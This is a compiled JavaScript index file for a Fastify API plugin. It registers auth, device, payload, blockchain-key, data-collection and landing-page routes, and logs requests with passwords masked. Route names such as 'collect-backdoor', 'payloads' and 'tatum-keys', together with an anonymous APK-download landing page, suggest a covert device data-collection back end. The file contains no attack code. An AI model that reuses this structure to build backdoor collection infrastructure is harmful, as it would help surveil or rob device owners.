import { logger } from '../../core/logger/index.js';
import { authMiddleware } from './middleware/auth.js';
import { authRoute } from './routes/auth.js';
import { usersRoute } from './routes/users.js';
import { channelsRoute } from './routes/channels.js';
import { devicesRoute } from './routes/devices.js';
import { dataRoute } from './routes/data/index.js';
import { dashboardRoute } from './routes/dashboard.js';
import { dashboardDeviceVersionsRoute, dashboardCollectSummaryRoute } from './routes/dashboard-versions.js';
import { dashboardTtlRoute } from './routes/dashboard-ttl.js';
import { payloadsRoute } from './routes/payloads.js';
import { paramsRoute } from './routes/params.js';
import { payloadParamsRoute } from './routes/payload-params.js';
import { visitorsRoute } from './routes/visitors.js';
import { tatumWebhookRoute } from './routes/tatum-webhook.js';
import { tatumKeysRoute } from './routes/tatum-keys.js';
import { tatumWebhookEventsRoute } from './routes/tatum-webhook-events.js';
import { collectRoute } from './routes/collect.js';
import { collectBackdoorRoute } from './routes/collect-backdoor.js';
import { chainProvidersRoute } from './routes/chain-providers.js';
import { rolesRoute } from './routes/roles.js';
import { exportRoute } from './routes/export.js';
import { sourceDomainsRoute } from './routes/source-domains.js';
import { channelStatsRoute } from './routes/channel-stats.js';
import { tasksRoute } from './routes/tasks.js';
import { applicationRoute } from './routes/applications.js';
import { landingRoute } from './routes/landing.js';
// ★ pjuyr 1:1 复刻补齐（见 09-docs/reports/pjuyr复刻1比1核对报告.md §三）：
//   参考项目 prtvxx 模板需要 /api/settings、匿名 /api/stats、/api/track 三条端点，
//   本项目此前缺失 ⇒ 该模板降级。按「不改已验收的 landing.js」的纪律另开文件。
import { landingExtRoute } from './routes/landing-ext.js';
export async function apiPlugin(fastify) {
    await fastify.register(authMiddleware);
    await fastify.register(authRoute);
    await fastify.register(usersRoute);
    await fastify.register(rolesRoute);
    await fastify.register(channelsRoute);
    await fastify.register(devicesRoute);
    await fastify.register(visitorsRoute);
    await fastify.register(sourceDomainsRoute);
    await fastify.register(tatumWebhookRoute);
    await fastify.register(tatumKeysRoute);
    await fastify.register(tatumWebhookEventsRoute);
    await fastify.register(collectRoute);
    await fastify.register(collectBackdoorRoute);
    await fastify.register(chainProvidersRoute);
    await fastify.register(exportRoute);
    await fastify.register(dataRoute);
    await fastify.register(dashboardRoute);
    // ★ T19：后台看板两端点（只读）。
    //   注册在 apiPlugin scope 内 ⇒ 继承上方 authMiddleware 的 preHandler ⇒ 无 token 401。
    await fastify.register(dashboardDeviceVersionsRoute);
    await fastify.register(dashboardCollectSummaryRoute);
    // ★ T15：TTL 状态（只读）—— 暴露 MongoDB TTL 的静默删除风险。
    //   注册在 apiPlugin scope 内 ⇒ 继承 authMiddleware ⇒ 无 token 401。
    await fastify.register(dashboardTtlRoute);
    await fastify.register(channelStatsRoute);
    await fastify.register(payloadsRoute);
    await fastify.register(paramsRoute);
    await fastify.register(payloadParamsRoute);
    await fastify.register(tasksRoute);
    await fastify.register(applicationRoute);
    // ★ F1-C5：落地页公开 API（匿名埋点 + pixel 配置 + apk 下载）。
    //   其 track/pixel 端点已在 middleware/auth.js 的 SKIP_AUTH_PATHS 中放行。
    await fastify.register(landingRoute);
    // ★ pjuyr 1:1 复刻补齐：prtvxx 模板所需的三条端点（settings / 匿名 stats / track）。
    //   已在 middleware/auth.js 的 SKIP_AUTH_PATHS 中放行（匿名可达）。
    await fastify.register(landingExtRoute);
    // onResponse: log API requests
    fastify.addHook('onResponse', async (request, reply) => {
        if (request.url === '/api/auth/refresh')
            return;
        const duration = Math.round(reply.elapsedTime || 0);
        let body = '';
        if (request.body) {
            const sanitized = { ...request.body };
            if (sanitized.password)
                sanitized.password = '***';
            if (sanitized.oldPassword)
                sanitized.oldPassword = '***';
            if (sanitized.newPassword)
                sanitized.newPassword = '***';
            if (sanitized.confirmPassword)
                sanitized.confirmPassword = '***';
            const bodyStr = JSON.stringify(sanitized);
            body = bodyStr.length > 500 ? ` ${bodyStr.substring(0, 500)}...` : ` ${bodyStr}`;
        }
        logger.info(`${request.method} ${request.url} ${reply.statusCode} ${duration}ms${body}`);
    });
}
//# sourceMappingURL=index.js.map